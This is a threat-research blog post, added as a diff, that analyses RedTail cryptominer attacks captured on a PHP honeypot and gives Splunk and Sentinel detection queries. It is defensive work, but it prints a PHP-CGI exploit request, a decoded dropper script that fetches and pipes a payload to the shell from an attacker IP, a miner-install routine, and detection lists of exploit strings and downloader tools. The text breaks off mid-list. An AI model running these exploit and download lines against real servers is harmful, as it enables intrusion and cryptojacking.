@@ -1,0 +1,491 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Detecting RedTail Cryptominer Attacks in Splunk and Sentinel (CrowdStrike and MDE) | Global SOC</title>
+<link rel="canonical" href="https://globalsoc.com.au/blog/detect-redtail-cryptominer/">
+<meta name="description" content="RedTail hit my PHP honeypot from 12 IPs with the same 49-request exploit kit. I walk through the payload step by step, map it to the kill chain and MITRE ATT&amp;CK, and give the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections I would run for it.">
+<meta property="og:site_name" content="Global SOC">
+<meta property="og:locale" content="en_AU">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://globalsoc.com.au/blog/detect-redtail-cryptominer/">
+<meta property="og:title" content="Detecting RedTail Cryptominer Attacks in Splunk and Sentinel (CrowdStrike and MDE) | Global SOC">
+<meta property="og:description" content="RedTail hit my PHP honeypot from 12 IPs with the same 49-request exploit kit. I walk through the payload step by step, map it to the kill chain and MITRE ATT&amp;CK, and give the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections I would run for it.">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Detecting RedTail Cryptominer Attacks in Splunk and Sentinel (CrowdStrike and MDE) | Global SOC">
+<meta name="twitter:description" content="RedTail hit my PHP honeypot from 12 IPs with the same 49-request exploit kit. I walk through the payload step by step, map it to the kill chain and MITRE ATT&amp;CK, and give the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections I would run for it.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://globalsoc.com.au/blog/detect-redtail-cryptominer/#article",
+      "url": "https://globalsoc.com.au/blog/detect-redtail-cryptominer/",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://globalsoc.com.au/blog/detect-redtail-cryptominer/"
+      },
+      "headline": "Detecting RedTail: From a 15-Second Exploit Spray to a Hidden Miner, in Splunk and Sentinel",
+      "description": "RedTail hit my PHP honeypot from 12 IPs with the same 49-request exploit kit. I walk through the payload step by step, map it to the kill chain and MITRE ATT&CK, and give the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections I would run for it.",
+      "datePublished": "2026-11-07",
+      "author": {
+        "@type": "Person",
+        "name": "Yogesh"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://globalsoc.com.au/#organization",
+        "name": "Global SOC",
+        "legalName": "Global SOC Pty Ltd",
+        "url": "https://globalsoc.com.au/"
+      },
+      "isPartOf": {
+        "@id": "https://globalsoc.com.au/blog/#blog"
+      },
+      "inLanguage": "en-AU"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://globalsoc.com.au/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://globalsoc.com.au/blog/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Detecting RedTail: From a 15-Second Exploit Spray to a Hidden Miner, in Splunk and Sentinel",
+          "item": "https://globalsoc.com.au/blog/detect-redtail-cryptominer/"
+        }
+      ]
+    }
+  ]
+}
+</script>
+<meta property="article:published_time" content="2026-11-07">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="author" content="Yogesh">
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#f5f7fa;color:#142333;font:17px/1.75 system-ui,sans-serif}
+header{background:#0b2436;color:white;padding:25px max(24px,calc((100vw - 1000px)/2))}
+header a{color:#a6e3ff;text-decoration:none}
+header a:hover{text-decoration:underline}
+main{max-width:1000px;margin:auto;padding:40px 24px 80px}
+h1{font-size:clamp(34px,5vw,52px);line-height:1.15;letter-spacing:-.035em;margin:16px 0 20px}
+h2{margin-top:52px;line-height:1.3;font-size:28px;border-bottom:1px solid #d6e1e9;padding-bottom:8px}
+h3{margin-top:32px;font-size:20px}
+p{max-width:82ch;margin:16px 0}
+pre{background:#10283a;color:#e3f2fc;padding:20px;border-radius:10px;overflow:auto;font:13.5px/1.65 Consolas,monospace;white-space:pre-wrap;overflow-wrap:anywhere}
+code{font-family:Consolas,monospace;background:#e9f0f5;color:#0b2436;padding:2px 6px;border-radius:4px;font-size:0.9em}
+pre code{background:transparent;color:inherit;padding:0}
+a{color:#076383}
+nav.toc{background:#e6f0f5;border-left:4px solid #087da4;padding:16px 22px;margin:24px 0}
+.meta{color:#47687c;font-size:14px;font-weight:600;letter-spacing:0.04em}
+table{width:100%;border-collapse:collapse;background:white;font-size:15px;margin:20px 0}
+td,th{padding:12px;border:1px solid #d6e1e9;text-align:left}
+th{background:#edf3f7}
+td code{overflow-wrap:anywhere}
+.alert-box{background:#f0fdf4;border-left:4px solid #16a34a;padding:16px 20px;border-radius:4px;margin:20px 0}
+.warn-box{background:#fef2f2;border-left:4px solid #dc2626;padding:16px 20px;border-radius:4px;margin:20px 0}
+@media(max-width:640px){table{font-size:12px}td,th{padding:6px}}
+.bar{fill:#087da4}.small{font-size:14px;color:#47687c}
+.org{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:6px;letter-spacing:.03em;vertical-align:1px}
+.orgA{background:#fde7d9;color:#7a2e0b}.orgB{background:#dbeafe;color:#1e3a8a}
+.kc{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:8px;background:#0b2436;color:#a6e3ff;vertical-align:3px;letter-spacing:.03em}
+ul,ol{max-width:82ch}li{margin:6px 0}
+</style>
+</head>
+<body>
+<header>
+  <div style="display:flex;justify-content:space-between;align-items:center;">
+    <div><a href="/">Global SOC</a> / <a href="/blog/">Blog</a></div>
+    <div><a href="/dnsaudit/">DNS Audit</a></div>
+  </div>
+</header>
+<main>
+<p class="meta">THREAT RESEARCH &amp; LABS · Yogesh · 7 November 2026</p>
+<h1>Detecting RedTail: From a 15-Second Exploit Spray to a Hidden Miner, in Splunk and Sentinel</h1>
+<p>RedTail hit my PHP honeypot from 12 IPs with the same 49-request exploit kit. I walk through the payload step by step, map it to the kill chain and MITRE ATT&amp;CK, and give the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections I would run for it.</p>
+<nav class="toc"><strong>Key Sections:</strong> What Hit the Server · The Attack, Step by Step · Pyramid of Pain · Web-Layer Detections · Endpoint Detections · When It Fires · Hardening · IOCs</nav>
+<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. Every web-layer KQL query on this page was run against the honeypot's real logs, and the counts quoted are what came back. The endpoint queries are written from the attacker's own script, because the honeypot had no EDR on it, so treat their field names as a starting point for your environment.</p>
+
+<h2 id="what">1. What Hit the Server</h2>
+
+<p>RedTail is a Monero-mining botnet. It doesn't phish anyone. It finds internet-facing web servers with old bugs, gets a shell as the web server user, and turns your CPU into someone else's income.</p>
+
+<p>Twelve IPs, in twelve different countries, ran the same 49-request exploit kit against my PHP honeypot between 23 October and 5 November. Each one showed up once, fired the whole kit in 8 to 146 seconds, and never came back. No repeat visits, no follow-up, no human. That's what a botnet's spreading module looks like from the receiving end.</p>
+
+<p>One request in that kit carries the real payload. It's a PHP-CGI argument-injection exploit that, if it lands, writes an SSH private key to disk and uses it to <code>scp</code> the next stage off the attacker's server:</p>
+
+<pre><code>POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+User-Agent: libredtail-http
+Content-Type: application/x-www-form-urlencoded
+
+&lt;?php shell_exec(base64_decode("Y2QgL3RtcCB8fCBjZCAvdmFyL3RtcCB8fCBj[... 1,300 base64 characters trimmed ...]")); echo(md5("Hello CVE-2024-4577")); ?&gt;</code></pre>
+
+<p>The honeypot runs PHP as an Apache module, not as php-cgi, so none of this executed. That's lucky for me and not much use to you. What's useful is that the attacker shipped me their entire playbook in plain text. Every step in it is something your EDR or your web logs can see, if you know what to look for.</p>
+
+<h2 id="steps">2. The Attack, Step by Step</h2>
+
+<p>Here's the full chain, from the first request to the miner running. For each step I've marked where it sits in the kill chain, the ATT&amp;CK technique, and which data source sees it.</p>
+
+<h3><span class="kc">Recon + Exploit</span> Step 1: The exploit spray</h3>
+
+<p>RedTail doesn't fingerprint your server first. It throws seven different exploit families at it in about fifteen seconds and lets the server tell it which one worked:</p>
+
+<table><thead><tr><th>#</th><th>Exploit</th><th>Requests</th><th>ATT&amp;CK</th></tr></thead><tbody>
+<tr><td>1</td><td>Apache 2.4.49/2.4.50 path traversal to <code>/bin/sh</code> (CVE-2021-41773, CVE-2021-42013)</td><td>2</td><td>T1190</td></tr>
+<tr><td>2</td><td>PHP-CGI argument injection (CVE-2024-4577, CVE-2012-1823)</td><td>5</td><td>T1190</td></tr>
+<tr><td>3</td><td>PHPUnit <code>eval-stdin.php</code> (CVE-2017-9841), 37 install paths</td><td>37</td><td>T1190</td></tr>
+<tr><td>4</td><td>ThinkPHP 5 <code>invokefunction</code> RCE</td><td>2</td><td>T1190</td></tr>
+<tr><td>5</td><td><code>pearcmd.php</code> through local file inclusion: write a PHP file, then include it</td><td>2</td><td>T1190, T1505.003</td></tr>
+<tr><td>6</td><td>Docker Engine API (<code>/containers/json</code>)</td><td>1</td><td>T1190</td></tr>
+</tbody></table>
+
+<p>Every exploit ends with a canary like <code>echo(md5("Hello CVE-2024-4577"))</code>. If the MD5 comes back in the response, the bot knows that exploit worked. That's also why I don't trust "status 200" as a sign of success: the honeypot answered 200 to 45 of these requests, and nothing ran.</p>
+
+<p><strong>Who sees it:</strong> your web server or WAF logs. The individual exploits are worth alerting on, but the shape is the stronger signal: one source, several unrelated CVE families, a few seconds. Real users never do that. Neither does a legitimate crawler.</p>
+
+<h3><span class="kc">Exploit + Execution</span> Step 2: PHP-CGI argument injection</h3>
+
+<p>On a server that runs PHP through php-cgi (XAMPP on Windows is the classic case), the query string <code>?-d allow_url_include=1 -d auto_prepend_file=php://input</code> turns into PHP command-line switches. The first one allows includes from streams. The second tells PHP to run the request body before the page. CVE-2024-4577 is the Windows twist: a soft hyphen (<code>%AD</code>) gets "best-fit" converted to a normal <code>-</code>, which gets around the old fix.</p>
+
+<p>The body is PHP that base64-decodes a shell script and runs it with <code>shell_exec</code>. That's T1059.004 (Unix shell), with T1027 and T1140 for the base64 wrapping.</p>
+
+<p><strong>Who sees it:</strong> web logs see the query string. Only the EDR sees what the shell then does.</p>
+
+<h3><span class="kc">Delivery</span> Step 3: Pulling the dropper over SSH</h3>
+
+<p>Here's the decoded script, as sent by six of the twelve bots. I've removed the private key and defanged the addresses:</p>
+
+<pre><code>cd /tmp || cd /var/tmp || cd /dev/shm
+echo '-----BEGIN OPENSSH PRIVATE KEY-----
+[private key removed]
+-----END OPENSSH PRIVATE KEY-----' &gt; key.ppk
+echo 'StrictHostKeyChecking no
+UserKnownHostsFile /dev/null' &gt; sshcfg
+chmod 400 key.ppk
+scp -s -F sshcfg -i key.ppk dlr@217.60.102[.]5:sh out_sh
+if [ $? -eq 0 ]; then
+  chmod +x out_sh
+  sh out_sh cve_2024_4577 &gt;/dev/null 2&gt;&amp;1
+else
+  (wget --no-check-certificate -qO- hxxps://217.60.102[.]5/sh || curl -sk hxxps://217.60.102[.]5/sh) | sh -s cve_2024_4577
+fi
+rm -rf sshcfg key.ppk out_sh</code></pre>
+
+<p>This is the part I like as a defender. Instead of the usual <code>wget | sh</code>, the bot writes an SSH key and a two-line SSH config that switches off host-key checking, then copies the next stage with <code>scp</code> over port 22. Most egress rules watch 80 and 443. Most web servers are allowed out on 22 because nobody thought to stop them. If <code>scp</code> fails, it falls back to HTTPS with certificate checks off.</p>
+
+<ul>
+<li><strong>T1105 Ingress Tool Transfer:</strong> <code>scp</code> from <code>dlr@217.60.102[.]5</code>, or <code>wget</code>/<code>curl</code> as the fallback.</li>
+<li><strong>T1070.004 File Deletion:</strong> the key, config and script are deleted straight after.</li>
+<li>The argument <code>cve_2024_4577</code> is a campaign tag. It tells the operator which exploit got them in.</li>
+</ul>
+
+<p>From 29 October, the other six bots sent a shorter body with no key and no <code>scp</code>, only the HTTPS download. Same server, same script. The operator dropped the clever part and kept what worked.</p>
+
+<p><strong>Who sees it:</strong> the EDR, as a web server process tree that ends in <code>scp</code>, <code>ssh</code>, <code>wget</code> or <code>curl</code>. Your firewall sees outbound TCP 22 from a web server, which should almost never happen.</p>
+
+<h3><span class="kc">Installation</span> Step 4: The dropper looks for somewhere to run</h3>
+
+<p>I have a copy of the <code>sh</code> script the staging host served. The part that matters for detection:</p>
+
+<pre><code># 1. find a directory this user can write AND execute from
+NOEXEC_DIRS=$(findmnt -rn -O noexec -o TARGET)
+FOLDERS=$(find / -type d -user $(whoami) -perm -u=rwx -not -path "/tmp/*" -not -path "/proc/*" ...)
+for i in $FOLDERS /tmp /var/tmp /dev/shm; do
+  if cd "$i" &amp;&amp; touch .testfile &amp;&amp; dd if=/dev/zero of=.testfile2 bs=2M count=1; then
+    rm -rf .testfile .testfile2; break
+  fi
+done
+
+# 2. kill the competition, remove older installs
+dlr clean; sh clean; rm -rf clean
+rm -rf .redtail
+
+# 3. fetch the miner for this CPU under a random hidden name, run it
+FILENAME=".$(get_random_string)"
+dlr x86_64            # or i686 / aarch64 / arm7 / riscv
+mv -f x86_64 $FILENAME
+chmod +x $FILENAME
+./$FILENAME cve_2024_4577</code></pre>
+
+<p>It lists the <code>noexec</code> mounts, searches the whole disk for directories the current user owns with execute rights, and writes a 2 MB test file to prove it can. If you mounted <code>/tmp</code> noexec to stop exactly this kind of thing, this is how it gets around you. Then it kills competing miners (<code>clean</code>), downloads the binary for your CPU, saves it under a random dot-name, and runs it.</p>
+
+<ul>
+<li><strong>T1083 File and Directory Discovery:</strong> <code>findmnt -O noexec</code>, <code>find / -user $(whoami) -perm -u=rwx</code>, and the <code>dd</code> test write.</li>
+<li><strong>T1564.001 Hidden Files:</strong> the miner is saved as <code>.&lt;random&gt;</code>.</li>
+<li><strong>T1027.002 Software Packing:</strong> the x86_64 binary is UPX-packed with its section headers stripped.</li>
+</ul>
+
+<p>There's no persistence in the script. No cron, no systemd unit, no <code>authorized_keys</code>. If the miner survives a reboot, the binary arranges that itself.</p>
+
+<p><strong>Who sees it:</strong> the EDR only. This is the richest stretch of the chain, and it's all process creation.</p>
+
+<h3><span class="kc">Actions on Objectives</span> Step 5: Mining</h3>
+
+<p>The binary mines Monero (T1496 Resource Hijacking). On a real server you'd see sustained CPU, an executable running from a writable directory under the web user, and outbound connections to a mining pool or proxy. Both Falcon and Defender for Endpoint ship built-in coin-miner detections, and they're usually what fires first. The custom detections below are for catching it earlier in the chain.</p>
+
+<h2 id="pyramid">3. Pyramid of Pain</h2>
+
+<p>Here's every indicator this attack gave me, ranked by how much it would hurt the attacker if you detected on it:</p>
+
+<table><thead><tr><th>Level</th><th>Indicator from this attack</th><th>What I'd do with it</th></tr></thead><tbody>
+<tr><td>Hash values</td><td>Dropper <code>917fcc91…</code>, miner <code>f0aa83bb…</code></td><td>Feed them to your EDR's block list and move on. The miner is repacked and saved under a random name, so the next sample will have a new hash.</td></tr>
+<tr><td>IP addresses</td><td>Staging host <code>217.60.102[.]5</code>; 12 scanner IPs</td><td>Block the staging host at egress. Don't bother with the scanner IPs: none of the twelve came back, and they're almost certainly other infected servers.</td></tr>
+<tr><td>Domain names</td><td>None</td><td>The operator uses a raw IP for everything, so DNS-based detection gives you nothing here. That's a lesson in itself.</td></tr>
+<tr><td>Network / host artefacts</td><td>User-Agent <code>libredtail-http</code>; files <code>key.ppk</code>, <code>sshcfg</code>, <code>.redtail</code>; campaign tag <code>cve_2024_4577</code>; SSH key <code>SHA256:O/at8341…</code></td><td>Good hunting pivots and cheap alerts. They're also one line of code away from changing. One source in my logs already sent the same PHP-CGI exploit with a fake Firefox User-Agent.</td></tr>
+<tr><td>Tools</td><td>The 49-request exploit kit; the dropper's "find an exec-able directory" routine</td><td>Detect the kit by its shape (many CVE families in a burst), not by any single request. Detect the dropper by the discovery commands it has to run.</td></tr>
+<tr><td>TTPs</td><td>Web server spawns a shell that downloads a file; web tier connects out on port 22; hidden executable runs from a writable directory as the web user</td><td>This is where to spend your effort. RedTail can change every indicator above overnight, but it still has to get a shell from your web server and run something it downloaded.</td></tr>
+</tbody></table>
+
+<h2 id="web">4. Web-Layer Detections</h2>
+
+<p>Both organisations log their web tier. For Org B I've parsed the honeypot's nginx log into a <code>WebAccess</code> function. Swap in your own source (<code>W3CIISLog</code>, App Gateway WAF in <code>AzureDiagnostics</code>, <code>CommonSecurityLog</code> from your WAF) and keep the column names. For Org A I've used the CIM <code>Web</code> data model, so the searches work for any web log that's CIM-mapped.</p>
+
+<pre><code>let WebAccess = Syslog
+| where SyslogMessage startswith "php_http: "
+| extend j = parse_json(substring(SyslogMessage, 10))
+| project TimeGenerated, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
+          Url = tostring(j.uri), Status = toint(j.status), BytesOut = toint(j.bytes_out),
+          UserAgent = tostring(j.user_agent), ContentType = tostring(j.content_type), Body = tostring(j.body);</code></pre>
+
+<h3>W1. The User-Agent (bottom of the pyramid, but free)</h3>
+
+<p><span class="org orgB">Org B</span> Tested: 521 requests from 12 sources, 23 Oct to 5 Nov.</p>
+<pre><code>WebAccess
+| where UserAgent == "libredtail-http"
+| summarize Requests = count(), Sources = dcount(SrcIp), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated)</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>| tstats count dc(Web.src) as sources min(_time) as first max(_time) as last
+    from datamodel=Web where Web.http_user_agent="libredtail-http"</code></pre>
+<p>Keep this as a low-severity alert. It costs nothing and has never produced a false positive for me. Just don't let it be your only RedTail detection.</p>
+
+<h3>W2. PHP-CGI argument injection (T1190)</h3>
+
+<p><span class="org orgB">Org B</span> Tested: 58 soft-hyphen requests and 11 plain <code>-d</code> requests, from 13 sources. 45 of them got a 200, and none of them worked.</p>
+<pre><code>WebAccess
+| where Request has_any ("allow_url_include", "auto_prepend_file")
+| extend Variant = iff(Request contains "%AD" or Request contains "%25AD", "CVE-2024-4577 soft-hyphen", "CVE-2012-1823 plain -d")
+| summarize Hits = count(), Answered200 = countif(Status == 200), Sources = dcount(SrcIp) by Variant</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>| tstats count values(Web.status) as status values(Web.http_user_agent) as ua
+    from datamodel=Web
+    where (Web.url="*allow_url_include*" OR Web.url="*auto_prepend_file*")
+    by Web.src Web.dest Web.url
+| eval variant=if(match('Web.url', "(?i)%(25)?AD"), "CVE-2024-4577 soft-hyphen", "CVE-2012-1823 plain -d")</code></pre>
+<p>That 13th source is the one with the fake Firefox User-Agent, which is why this rule matters more than W1. False positives are close to zero: no legitimate client puts <code>auto_prepend_file</code> in a query string. Medium severity on its own. Raise it to high if the target actually runs php-cgi (any Windows PHP host, XAMPP, older shared hosting), because then a 200 could mean it worked.</p>
+
+<h3>W3. The exploit burst (behavioural, catches the tool)</h3>
+
+<p>This is the one I'd put in production first. It doesn't care which CVEs are in the kit, only that one source tried several unrelated exploit families inside five minutes.</p>
+
+<p><span class="org orgB">Org B</span> Tested: 15 windows from 14 sources.</p>
+<pre><code>WebAccess
+| extend Family = case(
+    Request has_any ("allow_url_include", "auto_prepend_file"), "php-cgi-arg-injection",
+    Request has "eval-stdin.php", "phpunit-rce",
+    Request has "invokefunction", "thinkphp-rce",
+    Request has "pearcmd", "pearcmd-lfi",
+    Request has_any ("/cgi-bin/.%2e", "%%32%65", "/bin/sh"), "apache-traversal",
+    Request has "/containers/json", "docker-api",
+    Request has "${jndi:", "log4shell",
+    Request has "/.env", "env-file",
+    Request has "/.git/", "git-repo",
+    "")
+| where isnotempty(Family)
+| summarize Families = dcount(Family), FamilyList = make_set(Family), Requests = count(),
+            Start = min(TimeGenerated), End = max(TimeGenerated) by SrcIp, Window = bin(TimeGenerated, 5m)
+| where Families &gt;= 3
+| project Start, SrcIp, Families, Requests, DurationSec = datetime_diff("second", End, Start), FamilyList
+| order by Start asc</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>| tstats count from datamodel=Web by _time span=1s Web.src Web.dest Web.url
+| rename Web.* as *
+| eval family=case(
+    match(url, "allow_url_include|auto_prepend_file"), "php-cgi-arg-injection",
+    match(url, "eval-stdin\.php"),                   "phpunit-rce",
+    match(url, "invokefunction"),                      "thinkphp-rce",
+    match(url, "pearcmd"),                             "pearcmd-lfi",
+    match(url, "cgi-bin/(\.%2e|%%32%65)|/bin/sh"),    "apache-traversal",
+    match(url, "/containers/json"),                    "docker-api",
+    match(url, "\$\{jndi:"),                         "log4shell",
+    match(url, "/\.env"),                             "env-file",
+    match(url, "/\.git/"),                            "git-repo")
+| where isnotnull(family)
+| bin _time span=5m
+| stats dc(family) as families values(family) as family_list sum(count) as requests
+        min(_time) as start max(_time) as end by _time src dest
+| where families &gt;= 3
+| lookup authorised_scanners.csv src OUTPUT src as allowlisted
+| where isnull(allowlisted)</code></pre>
+
+<p>What it found on the honeypot:</p>
+<ul>
+<li><strong>11 of the 12 RedTail bots</strong>, each scoring 6 families. The twelfth stopped after six requests and never reached a third family.</li>
+<li><strong>My own authorised vulnerability scanner</strong>, scoring 3. That's your main false positive. Put your scanners' IPs in an allowlist, which is what the <code>authorised_scanners.csv</code> lookup is for in the Splunk version.</li>
+<li><strong>Two other spray scanners</strong>, also scoring 3. Neither was RedTail, and both are exactly what this rule is meant to catch.</li>
+</ul>
+
+<p>Run it as a medium-severity scheduled rule every 5 minutes. On its own it means "you're being sprayed", which happens to every internet-facing server every day. It becomes high severity when it fires together with any of the endpoint rules below on the same server. That combination is your real alert.</p>
+
+<h2 id="endpoint">5. Endpoint Detections</h2>
+
+<p>The web layer tells you someone tried. Only the EDR tells you it worked. Each rule below matches a step in the dropper, so an attacker has to rewrite their tooling to get around it, not just change a string.</p>
+
+<p>For Org A I've used CrowdStrike Falcon Data Replicator events in Splunk (<code>ProcessRollup2</code>, <code>NetworkConnectIP4</code>). Your index and sourcetype may differ, and if you have Falcon Insight you can run the same logic natively in Event Search. For Org B it's Defender for Endpoint Advanced Hunting tables, which Sentinel picks up through the Defender XDR connector.</p>
+
+<h3>E1. Web server spawns a shell or downloader (T1059.004, T1105)</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
+    (ParentBaseFileName IN ("apache2","httpd","nginx","php","php-cgi*","php-fpm*")
+     OR GrandParentBaseFileName IN ("apache2","httpd","nginx","php","php-cgi*","php-fpm*"))
+    FileName IN ("sh","bash","dash","wget","curl","scp","ssh","sftp","base64")
+| table _time ComputerName UserName GrandParentBaseFileName ParentBaseFileName FileName CommandLine
+| sort 0 _time</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>let WebServers = dynamic(["apache2","httpd","nginx","php","php-cgi","php-fpm","php-fpm8.3"]);
+DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where InitiatingProcessFileName in~ (WebServers) or InitiatingProcessParentFileName in~ (WebServers)
+| where FileName in~ ("sh","bash","dash","wget","curl","scp","ssh","sftp","base64")
+| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName,
+          InitiatingProcessFileName, FileName, ProcessCommandLine
+| order by Timestamp asc</code></pre>
+<p>This is the single most valuable rule against any web RCE, not only RedTail. It catches the <code>shell_exec</code> in step 2 and the <code>wget</code>, <code>curl</code> or <code>scp</code> in step 3. False positives come from apps that shell out on purpose: image conversion, PDF generation, the odd admin panel's "run backup" button. Baseline for a week, allowlist the exact command lines you find, and run it at high severity.</p>
+
+<h3>E2. Web tier connects out on SSH (T1105, T1048)</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
+    FileName IN ("scp","ssh","sftp")
+    UserName IN ("www-data","apache","nginx","httpd")
+| eval no_hostkey_check=if(match(CommandLine, "StrictHostKeyChecking[= ]no|UserKnownHostsFile[= ]/dev/null|-F\s+\S+"), 1, 0)
+| table _time ComputerName UserName ParentBaseFileName CommandLine no_hostkey_check
+
+index=crowdstrike event_platform=Lin event_simpleName=NetworkConnectIP4 RemotePort=22
+| join type=inner aid ContextProcessId_decimal
+    [ search index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
+        UserName IN ("www-data","apache","nginx","httpd")
+      | rename TargetProcessId_decimal as ContextProcessId_decimal
+      | fields aid ContextProcessId_decimal FileName CommandLine ]
+| where NOT cidrmatch("10.0.0.0/8", RemoteAddressIP4) AND NOT cidrmatch("172.16.0.0/12", RemoteAddressIP4)
+    AND NOT cidrmatch("192.168.0.0/16", RemoteAddressIP4)
+| table _time ComputerName FileName CommandLine RemoteAddressIP4 RemotePort</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>DeviceNetworkEvents
+| where Timestamp &gt; ago(7d)
+| where RemotePort == 22 and RemoteIPType == "Public"
+| where InitiatingProcessAccountName in~ ("www-data","apache","nginx","httpd")
+     or InitiatingProcessParentFileName in~ ("apache2","httpd","php","php-cgi","php-fpm","sh","bash","dash")
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName,
+          InitiatingProcessCommandLine, RemoteIP, RemotePort</code></pre>
+<p>A web server account opening SSH to a public IP is almost never legitimate. Deployment tools push in to the server; they don't usually pull out. The Splunk version also flags SSH command lines that switch off host-key checking, which is what RedTail's <code>sshcfg</code> does. Better still, block outbound 22 at the firewall and alert on the denies.</p>
+
+<h3>E3. "Where can I execute?" discovery (T1083)</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
+    ((FileName="findmnt" CommandLine="*noexec*")
+     OR (FileName="find" CommandLine="*-user*" CommandLine="*-perm*" CommandLine="*rwx*")
+     OR (FileName="dd" CommandLine="*if=/dev/zero*" CommandLine="*bs=2M*"))
+| bin _time span=2m
+| stats dc(FileName) as steps values(CommandLine) as commands by _time aid ComputerName UserName
+| where steps &gt;= 2</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where (FileName == "findmnt" and ProcessCommandLine has "noexec")
+     or (FileName == "find" and ProcessCommandLine has_all ("-user", "-perm") and ProcessCommandLine has "rwx")
+     or (FileName == "dd" and ProcessCommandLine has_all ("if=/dev/zero", "bs=2M"))
+| summarize Steps = dcount(FileName), Commands = make_set(ProcessCommandLine)
+          by DeviceName, AccountName, bin(Timestamp, 2m)
+| where Steps &gt;= 2</code></pre>
+<p>This is my favourite rule in the post. Looking for <code>noexec</code> mounts, hunting for owned directories with execute rights, and test-writing a 2 MB file is a very specific routine. Admins rarely chain these together within two minutes. Other Linux droppers use the same trick, so this rule outlives RedTail. Expect a handful of false positives from hardening-audit scripts, which you can allowlist by parent process.</p>
+
+<h3>E4. Hidden or temp-path executable run by the web user (T1564.001, T1036)</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
+    UserName IN ("www-data","apache","nginx","httpd")
+| rex field=ImageFileName "(?&lt;exe_dir&gt;.*)/(?&lt;exe_name&gt;[^/]+)$"
+| where like(exe_name, ".%")
+    OR match(exe_dir, "^(/tmp|/var/tmp|/dev/shm|/var/www|/run/user)")
+| table _time ComputerName UserName ImageFileName CommandLine ParentBaseFileName SHA256HashData</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where AccountName in~ ("www-data","apache","nginx","httpd")
+| where FileName startswith "."
+     or FolderPath matches regex @"^/(tmp|var/tmp|dev/shm|var/www|run/user)(/|$)"
+| project Timestamp, DeviceName, AccountName, FolderPath, FileName, ProcessCommandLine,
+          InitiatingProcessFileName, SHA256</code></pre>
+<p>Web server accounts should run the web server, the interpreter and very little else. A process running as <code>www-data</code> from a dot-file, <code>/tmp</code>, <code>/dev/shm</code> or the web root is a strong signal. High severity.</p>
+
+<h3>E5. Mining-pool connections (T1496)</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=NetworkConnectIP4
+    RemotePort IN (3333, 4444, 5555, 7777, 9999, 14433, 14444, 45560, 45700)
+| where NOT cidrmatch("10.0.0.0/8", RemoteAddressIP4) AND NOT cidrmatch("172.16.0.0/12", RemoteAddressIP4)
+    AND NOT cidrmatch("192.168.0.0/16", RemoteAddressIP4)
+| stats count values(RemotePort) as ports dc(RemoteAddressIP4) as remotes by aid ComputerName ContextProcessId_decimal
+| sort - count</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>let MiningPorts = dynamic([3333, 4444, 5555, 7777, 9999, 14433, 14444, 45560, 45700]);
+DeviceNetworkEvents
+| where Timestamp &gt; ago(7d)
+| where RemotePort in (MiningPorts) and RemoteIPType == "Public"
+| summarize Connections = count(), Ports = make_set(RemotePort), Remotes = make_set(RemoteIP, 20)
+          by DeviceName, InitiatingProcessFolderPath, InitiatingProcessFileName, InitiatingProcessAccountName
+| order by Connections desc</code></pre>
+<p>Use this as a hunt, not an alert. Pool port lists go stale quickly, and many miners now tunnel over 443. By the time this fires, you've already missed four earlier chances. The EDR's built-in miner detection is the better alert here.</p>
+
+<h2 id="respond">6. When It Fires</h2>
+
+<p>The order I'd work it in, whichever stack you're on:</p>
+<ol>
